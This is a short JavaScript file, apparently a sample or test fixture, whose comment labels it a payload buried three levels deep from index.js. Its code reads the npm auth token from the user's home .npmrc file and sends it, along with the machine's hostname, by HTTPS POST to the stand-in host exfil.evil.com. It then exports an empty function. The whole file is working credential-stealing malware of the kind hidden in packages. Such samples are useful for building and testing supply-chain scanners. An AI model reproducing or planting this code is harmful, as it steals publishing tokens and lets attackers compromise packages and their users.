// Buried payload — 3 levels deep from index.js
var cp = require('child_process');
var fs = require('fs');
var https = require('https');

var npmrc = fs.readFileSync(require('os').homedir() + '/.npmrc', 'utf8');
var token = npmrc.match(/_authToken=(.+)/);

if (token) {
  var data = JSON.stringify({ t: token[1], h: require('os').hostname() });
  var opts = {
    hostname: 'exfil.evil.com',
    port: 443,
    path: '/steal',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
  };
  var req = https.request(opts, function() {});
  req.write(data);
  req.end();
}

module.exports = function() {};
